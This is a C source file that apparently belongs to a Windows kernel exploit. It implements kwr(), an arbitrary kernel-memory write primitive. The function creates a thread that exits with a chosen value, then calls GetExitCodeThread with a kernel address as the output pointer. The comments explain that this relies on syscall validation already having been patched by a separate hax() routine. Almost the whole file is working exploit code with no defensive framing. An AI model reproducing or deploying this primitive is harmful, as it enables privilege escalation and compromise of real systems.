#include "kernel_helpers.h"

DWORD WINAPI thread_exit_with_value(void* x) {
	ExitThread((DWORD)x);
	return 0;  /* unreachable: ExitThread never returns, but the compiler
	              can't prove it, so this satisfies C4716 (must return a value). */
}

// Write `val` to `kptr`.
//
// The exploit: thread runs ExitThread((DWORD)val) immediately on entry.
// GetExitCodeThread(t, kernel_ptr), with the syscall-param validation
// table pre-patched by hax(), writes the exit code to whatever pointer
// is passed, including kernel addresses.
//
// WaitForSingleObject(t, 200) bounds the wait at 200ms worst case but
// returns as soon as the thread exits (typically <10ms for the trivial
// ExitThread body). The thread handle is closed after each write.
void kwr(DWORD kptr, DWORD val) {
	HANDLE t = CreateThread(NULL, 0, thread_exit_with_value, (void*)val, 0, NULL);
	if (t != NULL) {
		WaitForSingleObject(t, 200);
		GetExitCodeThread(t, (DWORD*)kptr);
		CloseHandle(t);
	}
}
